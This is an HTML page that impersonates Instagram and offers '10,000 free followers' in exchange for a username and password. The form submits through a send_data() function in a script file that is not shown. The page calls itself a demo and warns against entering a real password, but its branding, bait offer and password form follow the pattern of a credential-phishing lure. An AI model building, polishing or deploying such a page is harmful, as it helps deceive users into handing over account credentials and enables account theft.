
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Followers | Demo</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <main class="page">
        <section class="login-card">

            <div class="brand">Instagram</div>

            <div class="promo">
                <span class="tag">DEMO PROMOTION</span>
                <h1>Get 10,000 Followers</h1>
                <p>
                    Preview a free-follower promotion using
                    a demo username. No Instagram login required.
                </p>
            </div>

            <form id="demoForm">
                <label for="username">Demo username</label>
                <input
                    type="text"
                    id="username"
                    name="username"
                    placeholder="Enter your username"
                    autocomplete="off"
                    required
                >

                <label for="password">Test password</label>
                <input
                    type="password"
                    id="password"
                    placeholder="Enter your password"
                    autocomplete="new-password"
                    required
                >

                <p class="privacy">
                    Demo only. Never enter your real Instagram password.
                </p>

                <button onclick="send_data()" >Continue</button>
            </form>

</body>
<script src="script.js"></script>
</html>
